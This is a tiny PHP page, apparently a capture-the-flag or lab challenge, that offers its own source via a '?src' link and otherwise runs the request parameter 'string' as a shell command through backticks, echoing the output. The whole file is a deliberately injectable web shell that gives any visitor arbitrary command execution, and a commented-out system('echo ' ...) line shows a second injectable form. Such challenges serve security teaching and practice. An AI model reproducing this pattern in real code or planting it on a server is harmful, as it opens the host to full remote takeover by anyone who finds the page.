<?php

if (isset($_GET['src'])){
    highlight_file(__FILE__);}
else if( isset( $_REQUEST[ 'string' ]  ) ) {
    $target = $_REQUEST[ 'string' ];
    //$cmd = system('echo '.$_GET['string']);
    //echo "<pre>{$cmd}</pre>";
    echo `$target`; 
}
?>
<a href='?src'>Source Code</a>
